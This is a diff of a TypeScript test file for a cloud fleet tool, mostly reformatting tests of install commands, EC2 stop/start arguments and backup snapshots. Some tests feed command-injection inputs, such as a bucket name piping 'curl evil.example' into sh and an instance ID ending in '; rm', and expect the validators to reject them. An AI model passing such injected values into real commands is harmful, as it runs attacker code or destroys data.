@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vite-plus/test";
+
 import {
   backupIdFor,
   type BackupManifest,
@@ -31,7 +32,9 @@ describe("what is sent to a node", () => {
       "/usr/local/sbin/celld-install my-fleet-bucket v0.6.2 4eca87c6797590000a344c1b768364e9696e8817f5fbc16193f459d2edac7cd0",
     ]);
     expect(() => commands.install("my-fleet-bucket", "v0.7.0" as never)).toThrow();
-    expect(() => commands.install("bucket; curl evil.example | sh", "v0.6.2")).toThrow("not a bucket name");
+    expect(() => commands.install("bucket; curl evil.example | sh", "v0.6.2")).toThrow(
+      "not a bucket name",
+    );
   });
 
   it("asks celld itself for the fleet's state, with the settings systemd gives it", () => {
@@ -74,7 +77,10 @@ describe("losing a node on purpose", () => {
     ]);
     // Stopped, not terminated: the instance and its volume come back with start-instances.
     expect(killArgs({ instanceId, region })).not.toContain("terminate-instances");
-    expect(startInstanceArgs({ instanceId, region }).slice(0, 2)).toEqual(["ec2", "start-instances"]);
+    expect(startInstanceArgs({ instanceId, region }).slice(0, 2)).toEqual([
+      "ec2",
+      "start-instances",
+    ]);
     expect(() => killArgs({ instanceId: "i-123; rm", region })).toThrow("not an instance ID");
   });
 });
@@ -86,8 +92,18 @@ describe("backup and restore", () => {
     region,
     source: { bucket: "my-fleet-bucket", prefix: "fleet" },
     nodes: [
-      { node: "a", volumeId: "vol-0aaaaaaaaaaaaaaaa", snapshotId: "snap-0aaaaaaaaaaaaaaaa", celldVersion: "v0.6.2" },
-      { node: "b", volumeId: "vol-0bbbbbbbbbbbbbbbb", snapshotId: "snap-0bbbbbbbbbbbbbbbb", celldVersion: "v0.6.2" },
+      {
+        node: "a",
+        volumeId: "vol-0aaaaaaaaaaaaaaaa",
+        snapshotId: "snap-0aaaaaaaaaaaaaaaa",
+        celldVersion: "v0.6.2",
+      },
+      {
+        node: "b",
+        volumeId: "vol-0bbbbbbbbbbbbbbbb",
+        snapshotId: "snap-0bbbbbbbbbbbbbbbb",
+        celldVersion: "v0.6.2",
+      },
     ],
   });
   const restore = (overrides: object = {}) =>
@@ -121,7 +137,9 @@ describe("backup and restore", () => {
     ]);
     // A backup never deletes.
     expect(copy.args).not.toContain("--delete");
-    expect(snapshotArgs({ volumeId: "vol-0aaaaaaaaaaaaaaaa", node: "a", id: manifest.id, region })).toContain(
+    expect(
+      snapshotArgs({ volumeId: "vol-0aaaaaaaaaaaaaaaa", node: "a", id: manifest.id, region }),
+    ).toContain(
       "ResourceType=snapshot,Tags=[{Key=aih:backup,Value=20261012T010203Z},{Key=aih:node,Value=a}]",
     );
   });
